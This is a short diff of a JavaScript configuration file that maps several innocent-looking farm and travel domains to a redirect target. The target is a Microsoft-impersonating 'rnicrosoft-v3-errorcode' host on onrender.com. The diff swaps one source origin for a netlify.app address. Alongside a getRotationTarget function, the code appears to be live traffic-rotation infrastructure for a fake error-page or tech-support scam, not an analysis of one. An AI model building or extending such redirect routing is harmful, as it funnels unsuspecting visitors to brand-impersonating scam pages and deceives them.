@@ -85,7 +85,7 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairy.com": { method: "redirect", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
+    "https://naotoshidairyfarm.netlify.app": { method: "redirect", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
     "https://takahirofarmfood.com": { method: "redirect", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
     "https://hiroakitravels.com": { method: "redirect", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
   },
